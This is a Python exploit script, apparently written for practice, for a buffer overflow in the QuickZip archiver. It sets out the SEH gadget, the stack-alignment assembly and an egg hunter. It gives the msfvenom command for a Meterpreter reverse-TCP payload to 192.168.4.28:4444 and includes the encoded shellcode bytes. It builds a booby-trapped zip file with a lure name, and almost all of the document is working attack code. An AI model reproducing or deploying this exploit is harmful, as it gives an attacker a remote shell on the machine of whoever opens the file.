# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in QuickZip. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.


# 0x00422833 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)

# EggHunter: "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"  Egg: YCSC

# Command to encode egg hunter: msfvenom -p generic/custom PAYLOADFILE=egg.bin -e x86/alpha_mixed BufferRegister=EAX -f python

# Command to generate shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.4.28 LPORT=4444 -e x86/alpha_mixed BufferRegister=EDI -f python

# Flow of Events
# 1. Hit POP POP RETN
# 2. Jump back to a larger buffer space of 55 bytes tacking advantage of character translation by the application: 
# 	 
#	 \x89\x80 - Gets translated to EBC7              jmp short 0xffffffc9 

# 3. Carve out long jump JMP $-200  (200 Bytes) // 00000000  E933FFFFFF        jmp 0xffffff38


#	 0012FBCC   54               PUSH ESP
#	 0012FBCD   58               POP EAX
#	 0012FBCE   66:05 3B06       ADD AX,63B
#	 0012FBD2   50               PUSH EAX
#	 0012FBD3   5C               POP ESP
#	 0012FBD4   66:05 0404       ADD AX,404
#	 0012FBD8   66:50            PUSH AX
#	 0012FBDA   66:50            PUSH AX
#	 0012FBDC   66:2D 0B66       SUB AX,660B
#	 0012FBE0   66:2D 0B66       SUB AX,660B
#	 0012FBE4   66:50            PUSH AX
#
# 4. Start aligning stack
#
#	 0012FBE6   66:05 6F6F       ADD AX,6F6F
#	 0012FBEA   66:05 6852       ADD AX,5268
#
#
# 5. Jump back 200 bytes
# 
# 6. Complete stack alignment   //Align stack - Execution of shellcode overwrites stack (and thus the original shellcode) if stack is not aligned.
#
#	 
#	 0012FB2E   50               PUSH EAX
#	 0012FB2F   5C               POP ESP
#
# 7. Code to align EAX with encoded egg hunter code
#
#	 0012FB30   66:05 6F05       ADD AX,56F
#	 0012FB34   04 1F            ADD AL,1F
#	 0012FB36   2C 09            SUB AL,9
#	 0012FB38   2C 01            SUB AL,1
#
# 8. Run Egg Huter code
# 9. Find egg and run Shellcode


#Encoded egg hunter code 118 bytes

egg =  ""
egg += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egg += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
egg += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
egg += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
egg += "\x61\x76\x6f\x71\x48\x4a\x49\x6f\x64\x4f\x47\x32\x70"
egg += "\x52\x30\x6a\x37\x72\x76\x38\x48\x4d\x74\x6e\x55\x6c"
egg += "\x35\x55\x71\x4a\x33\x44\x6a\x4f\x48\x38\x70\x59\x73"
egg += "\x73\x50\x53\x32\x63\x6c\x4b\x38\x7a\x4e\x4f\x42\x55"
egg += "\x59\x7a\x4e\x4f\x72\x55\x68\x67\x39\x6f\x78\x67\x41"
egg += "\x41"

#Shellcode - 736 bytes

buf =  ""
buf += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x79\x6c\x48\x68\x6b\x32\x63\x30\x63\x30\x67\x70\x51"
buf += "\x70\x4d\x59\x48\x65\x34\x71\x4b\x70\x51\x74\x6e\x6b"
buf += "\x76\x30\x56\x50\x4c\x4b\x32\x72\x34\x4c\x4c\x4b\x50"
buf += "\x52\x67\x64\x4c\x4b\x44\x32\x45\x78\x66\x6f\x6c\x77"
buf += "\x32\x6a\x65\x76\x44\x71\x6b\x4f\x6e\x4c\x55\x6c\x50"
buf += "\x61\x31\x6c\x46\x62\x76\x4c\x75\x70\x39\x51\x7a\x6f"
buf += "\x66\x6d\x67\x71\x38\x47\x79\x72\x69\x62\x53\x62\x62"
buf += "\x77\x4c\x4b\x32\x72\x64\x50\x6c\x4b\x71\x5a\x37\x4c"
buf += "\x4c\x4b\x30\x4c\x32\x31\x43\x48\x79\x73\x73\x78\x65"
buf += "\x51\x6e\x31\x46\x31\x4c\x4b\x70\x59\x31\x30\x73\x31"
buf += "\x78\x53\x6e\x6b\x37\x39\x75\x48\x4b\x53\x44\x7a\x42"
buf += "\x69\x4c\x4b\x67\x44\x4e\x6b\x46\x61\x7a\x76\x36\x51"
buf += "\x79\x6f\x6e\x4c\x79\x51\x58\x4f\x56\x6d\x33\x31\x38"
buf += "\x47\x45\x68\x79\x70\x54\x35\x39\x66\x47\x73\x61\x6d"
buf += "\x4b\x48\x35\x6b\x63\x4d\x44\x64\x71\x65\x78\x64\x62"
buf += "\x78\x4c\x4b\x46\x38\x77\x54\x53\x31\x59\x43\x50\x66"
buf += "\x6e\x6b\x46\x6c\x72\x6b\x6c\x4b\x46\x38\x37\x6c\x45"
buf += "\x51\x38\x53\x6e\x6b\x63\x34\x4c\x4b\x35\x51\x7a\x70"
buf += "\x4b\x39\x31\x54\x57\x54\x75\x74\x51\x4b\x53\x6b\x51"
buf += "\x71\x36\x39\x52\x7a\x56\x31\x59\x6f\x79\x70\x31\x4f"
buf += "\x43\x6f\x43\x6a\x4e\x6b\x37\x62\x48\x6b\x4c\x4d\x53"
buf += "\x6d\x42\x48\x75\x63\x50\x32\x37\x70\x63\x30\x53\x58"
buf += "\x53\x47\x30\x73\x45\x62\x61\x4f\x56\x34\x63\x58\x72"
buf += "\x6c\x52\x57\x64\x66\x73\x37\x4e\x69\x6a\x48\x59\x6f"
buf += "\x48\x50\x6c\x78\x6e\x70\x67\x71\x45\x50\x65\x50\x76"
buf += "\x49\x5a\x64\x72\x74\x42\x70\x72\x48\x76\x49\x6d\x50"
buf += "\x50\x6b\x73\x30\x59\x6f\x4b\x65\x42\x4a\x64\x4a\x70"
buf += "\x68\x69\x50\x69\x38\x57\x74\x67\x6c\x71\x78\x67\x72"
buf += "\x43\x30\x32\x31\x51\x4c\x4e\x69\x59\x76\x66\x30\x52"
buf += "\x70\x36\x30\x30\x50\x61\x50\x42\x70\x67\x30\x46\x30"
buf += "\x42\x48\x39\x7a\x44\x4f\x4b\x6f\x6d\x30\x69\x6f\x5a"
buf += "\x75\x4f\x67\x63\x5a\x72\x30\x71\x46\x56\x37\x71\x78"
buf += "\x4d\x49\x6e\x45\x74\x34\x45\x31\x49\x6f\x4b\x65\x6b"
buf += "\x35\x49\x50\x32\x54\x34\x4a\x39\x6f\x70\x4e\x54\x48"
buf += "\x52\x55\x48\x6c\x68\x68\x53\x57\x73\x30\x33\x30\x57"
buf += "\x70\x63\x5a\x67\x70\x43\x5a\x47\x74\x56\x36\x63\x67"
buf += "\x63\x58\x44\x42\x68\x59\x49\x58\x73\x6f\x59\x6f\x4e"
buf += "\x35\x4d\x53\x48\x78\x55\x50\x71\x6e\x47\x46\x6e\x6b"
buf += "\x44\x76\x32\x4a\x57\x30\x52\x48\x45\x50\x36\x70\x73"
buf += "\x30\x53\x30\x72\x76\x72\x4a\x73\x30\x72\x48\x66\x38"
buf += "\x4d\x74\x61\x43\x49\x75\x59\x6f\x4a\x75\x4e\x73\x73"
buf += "\x63\x31\x7a\x73\x30\x43\x66\x31\x43\x56\x37\x32\x48"
buf += "\x65\x52\x6e\x39\x7a\x68\x71\x4f\x6b\x4f\x78\x55\x6b"
buf += "\x33\x69\x68\x35\x50\x71\x6d\x66\x48\x32\x78\x35\x38"
buf += "\x67\x70\x53\x70\x35\x50\x53\x30\x53\x5a\x35\x50\x52"
buf += "\x70\x32\x48\x76\x6b\x46\x4f\x66\x6f\x56\x50\x69\x6f"
buf += "\x7a\x75\x33\x67\x55\x38\x63\x45\x72\x4e\x70\x4d\x73"
buf += "\x51\x69\x6f\x38\x55\x71\x4e\x31\x4e\x69\x6f\x76\x6c"
buf += "\x37\x54\x76\x6f\x4f\x75\x54\x30\x69\x6f\x39\x6f\x6b"
buf += "\x4f\x79\x79\x4d\x4b\x79\x6f\x39\x6f\x79\x6f\x56\x61"
buf += "\x7a\x63\x65\x79\x68\x46\x42\x55\x4b\x71\x59\x53\x4f"
buf += "\x4b\x78\x70\x4f\x45\x4c\x62\x33\x66\x30\x6a\x53\x30"
buf += "\x46\x33\x69\x6f\x6e\x35\x41\x41"


filename="ycsc-important.zip"

# Building zip file structure

ldf_header = "\x50\x4B\x03\x04\x14\x00\x00"
ldf_header +="\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
ldf_header +="\x00\x00\x00\x00\x00\x00\x00\x00"
ldf_header +="\xe4\x0f" # file size
ldf_header +="\x00\x00\x00"

cdf_header = "\x50\x4B\x01\x02\x14\x00\x14"
cdf_header +="\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" 
cdf_header +="\x00\x00\x00\x00\x00\x00\x00\x00\x00"
cdf_header += "\xe4\x0f" # file size
cdf_header +="\x00\x00\x00\x00\x00\x00\x01\x00"
cdf_header += "\x24\x00\x00\x00\x00\x00\x00\x00"

eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
eofcdf_header += "\x12\x10\x00\x00" # Size of central directory (bytes)
eofcdf_header +="\x02\x10\x00\x00" # Offset of start of central directory,
                    # relative to start of archive
eofcdf_header +="\x00\x00"

payload =  "A" * 88  
payload += "\x50\x5C\x66\x05\x6F\x05\x04\x1F\x2C\x09\x2C\x01" 
payload += "A"*10 
payload += egg
payload += "A"*10 
payload += "C"*8 
payload += "\x54\x58\x66\x05\x3B\x06\x50\x5C\x66\x05\x04\x04\x66\x50\x66\x50\x66\x2D\x0b\x66\x66\x2D\x0B\x66\x66\x50\x66\x05\x6f\x6f\x66\x05\x68\x52" 
payload += "A"*14 
payload += "\x89\x80\x41\x41" +"\x33\x28\x42\x00" + "YCSCYCSC" 
payload += buf 
payload += "B"* 3018
payload += ".txt"


print "Creating " + filename + " file \n";

textfile = open(filename,'w')
textfile.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
textfile.close()
